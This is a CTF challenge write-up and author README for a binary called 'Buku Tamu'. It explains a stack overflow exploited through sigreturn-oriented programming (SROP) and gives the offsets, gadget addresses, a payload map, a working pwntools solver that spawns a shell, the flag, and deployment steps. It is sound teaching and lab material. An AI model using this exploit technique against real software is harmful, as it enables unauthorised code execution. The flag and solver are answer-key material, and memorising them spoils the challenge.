# Buku Tamu — SROP

**Category:** pwn · **Flag:** `ctf{sr0p_1s_th3_0nly_w4y_0ut_0f_g4dg3t_st4rv4t10n}`

---

## 1. Recon

```
$ checksec --file=./chall
RELRO           STACK CANARY      NX          PIE       RPATH     RUNPATH     Symbols  FORTIFY
Partial RELRO   No canary found   NX enabled  No PIE    No RPATH  No RUNPATH  45       No
```

Dynamically linked, not stripped. No PIE means every address in the image is a
constant. No canary means a straight stack smash. NX means no shellcode.

```
$ strings ./chall | grep -i 'bin/sh'
$                                    # nothing. there is no shell string in the binary.
```

There is **no leak primitive and no format string**, so libc stays out of reach.
Everything has to come from the image itself.

## 2. The program

```
1) set name      -> read(0, g_name, 16)    // g_name is a 16-byte .bss global
2) leave message -> char buf[0x20]; read(0, buf, 0x400); return
```

Option 1 writes 16 attacker-controlled bytes to a **fixed** address.
Option 2 reads `0x400` bytes into a `0x20` stack buffer. That is the bug.

### Exact overflow offset

From the disassembly, `leave_message` is a textbook frame:

```
401209 <leave_message>:
  40120d: push rbp
  40120e: mov  rbp,rsp
  401211: sub  rsp,0x20
  401224: lea  rax,[rbp-0x20]     <- buf
  401235: call read@plt
  40123b: leave
  40123c: ret
```

`buf` sits at `rbp-0x20`, the saved `rbp` occupies the next 8 bytes.

> **Saved RIP is at `buf + 0x28` (40 bytes).**

Confirmed dynamically with a cyclic pattern: when the process faults on `ret`,
the qword at `$rsp-8` is `0x6161616167616161`, which `cyclic_find(n=8)` places at
pattern index 45. Subtract the 13 pattern bytes that `menu()`'s
`read(0, c, 15)` swallows alongside `"2\n"` when stdin is a file, and the saved
`rbp` lands at `buf+0x20` — so the return address is at `buf+0x28`.

Budget check: `0x28 + 8 + 8 + 8 + 248 = 312` bytes (`0x138`) out of the `0x400`
(1024) available. 712 bytes of headroom, so payload length is never a constraint.

## 3. Gadget starvation — why the obvious paths die

Full pop/syscall inventory of the image:

```
$ ROPgadget --binary chall | grep -E ' : (pop|syscall)'
0x00000000004011d6 : pop rax ; ret
0x00000000004011bd : pop rbp ; ret
0x00000000004011d8 : syscall
```

That is the whole supply. It comes from a deliberate stub in the source:

```c
__asm__(".global gadgets\ngadgets:\npop %rax\nret\nsyscall\nret\n");
```

| Attempt | Why it fails |
|---|---|
| `ret2libc` (`system`, one_gadget) | no leak, ASLR on libc, nothing in the GOT is ever printed back |
| `ret2plt` on `printf`/`puts` to leak | needs `rdi`; there is no `pop rdi` |
| `ret2syscall` `execve("/bin/sh",0,0)` | needs `rdi`, `rsi`, `rdx`; only `rax` is loadable |
| shellcode on the stack | NX |
| GOT overwrite (Partial RELRO) | needs a write with a controllable destination — `read` into `.bss` is hardcoded to `g_name`, and calling `read` again still needs `rsi` |
| `__libc_csu_init` universal gadget | glibc ≥ 2.34 (Ubuntu 22.04) no longer emits it |

### Nothing else survives

`pop rbp ; ret` is the only other pop in the image, and `rbp` is not an argument
register. gcc's CRT normally contributes two more sequences out of
`deregister_tm_clones` and `register_tm_clones`, including a
`mov edi, <bss> ; jmp rax` that looks like it loads `rdi`. Those stubs are dead
code in this program, so the build blanks them to `ret` (`src/strip-crt.sh`) and
they are not in the shipped binary:

```
$ ROPgadget --binary chall | grep -E ': (pop|mov|xchg|lea) (rdi|rsi|rdx|rax)'
0x00000000004011d6 : pop rax ; ret
```

**Only `rax` is controllable. The one syscall whose entire argument set comes
from memory instead of registers is `rt_sigreturn`. Hence SROP.**

## 4. SROP

`rt_sigreturn` (syscall 15) is the kernel's return path out of a signal handler.
It takes no register arguments — it pops a `struct rt_sigframe` off the stack and
restores **every** general-purpose register, plus `rip`, `rsp` and the segment
selectors, from it. On x86-64 the relevant slice is 248 bytes
(`pwnlib.rop.srop.SigreturnFrame`).

So: set `rax = 15` with the one gadget available, execute `syscall` with `rsp`
pointing at a frame we control, and the kernel loads `rdi`/`rsi`/`rdx`/`rax`/`rip`
for us — the exact register file that gadget starvation denied.

### Chain

1. **Option 1** — write `"/bin/sh\0"` to `g_name` at `0x404070`. Fixed address,
   no PIE, no leak needed.
2. **Option 2** — overwrite the saved RIP at offset `0x28` with
   `pop rax ; ret` → `15` → `syscall ; ret`.
3. Immediately after those three qwords, lay down the 248-byte sigreturn frame.
   When `syscall` executes, `rsp` points exactly at its first byte.
4. The kernel restores `rax=59`, `rdi=&g_name`, `rsi=0`, `rdx=0`, `rip=` the same
   `syscall ; ret` gadget, `rsp=` a writable `.bss` address, `cs=0x33`.
5. Execution resumes at `syscall` with `rax=59` → `execve("/bin/sh", NULL, NULL)`.

### Payload map (312 bytes)

| Offset | Size | Contents |
|---|---|---|
| `0x000` | `0x28` | padding (`buf[0x20]` + saved `rbp`) |
| `0x028` | 8 | `0x4011d6` — `pop rax ; ret` |
| `0x030` | 8 | `15` — `SYS_rt_sigreturn` |
| `0x038` | 8 | `0x4011d8` — `syscall ; ret` |
| `0x040` | 248 | `SigreturnFrame()` |

Frame values: `rax=59`, `rdi=0x404070`, `rsi=0`, `rdx=0`, `rip=0x4011d8`,
`rsp=0x404440`, `csgsfs=0x33`.

> Note on `ss`: the amd64 `sigcontext` has no `ss` field — `cs`, `gs` and `fs` are
> packed into the single `csgsfs` qword, and the kernel forces `SS` to `0x2b`
> itself on sigreturn. Setting `csgsfs = 0x33` (also pwntools' default) yields
> exactly the intended `cs=0x33 / ss=0x2b` state.

## 5. Exploit

See `solve.py`. Core:

```python
OFFSET  = 0x28
POP_RAX = elf.sym['gadgets']      # pop rax ; ret
SYSCALL = POP_RAX + 2             # syscall ; ret
BINSH   = elf.sym['g_name']

io.sendlineafter(b'> ', b'1')
io.sendafter(b'name (16): ', b'/bin/sh\0')

frame        = SigreturnFrame()
frame.rax    = constants.SYS_execve
frame.rdi    = BINSH
frame.rsi    = frame.rdx = 0
frame.rip    = SYSCALL
frame.rsp    = elf.bss(0x400)
frame.csgsfs = 0x33

payload = b'A'*OFFSET + p64(POP_RAX) + p64(constants.SYS_rt_sigreturn) \
        + p64(SYSCALL) + bytes(frame)

io.sendlineafter(b'> ', b'2')
io.sendafter(b'message: ', payload)
io.interactive()
```

Run:

```
python3 solve.py                                 # local ./chall
python3 solve.py REMOTE HOST=1.2.3.4 PORT=5500   # remote
```

Because the whole chain lives inside the no-PIE image, the exploit is
**libc-version independent** — it was verified byte-identical against Ubuntu
22.04 (deployment) and Kali rolling (development) glibc.

## 6. Build & deploy

```
cd src && make                 # produces src/chall with the pinned flags
docker compose up --build -d   # serves on 0.0.0.0:5500
```

`Dockerfile` uses **pwn.red/jail** (redpwn jail / nsjail), which forks a fresh
isolated process per TCP connection. `JAIL_PORT=5500` makes the jail listen on
the port `docker-compose.yml` publishes; the compose file overrides the
`JAIL_TIME` / `JAIL_MEM` / `JAIL_PIDS` / `JAIL_CPU` limits.

## 7. Layout

```
./
  Dockerfile            pwn.red/jail deployment
  challenge.yml         CTFd challenge metadata
  docker-compose.yml    build + serve on :5500
  README.md             author-facing
src/
  chall.c  Makefile  strip-crt.sh      source and build
  chall                               build output
  flag.txt                            the real flag, baked into the image
  README.player.md                    player README, packed into the zip
public/
  dist-buku-tamu.zip    the only thing players get
writeup/
  solve.py              working solver, local + remote
  README.md             this file
```

Run the solver from `writeup/`:

```
python3 solve.py                                       # local ../src/chall
python3 solve.py REMOTE HOST=34.1.203.129 PORT=5500    # remote
```
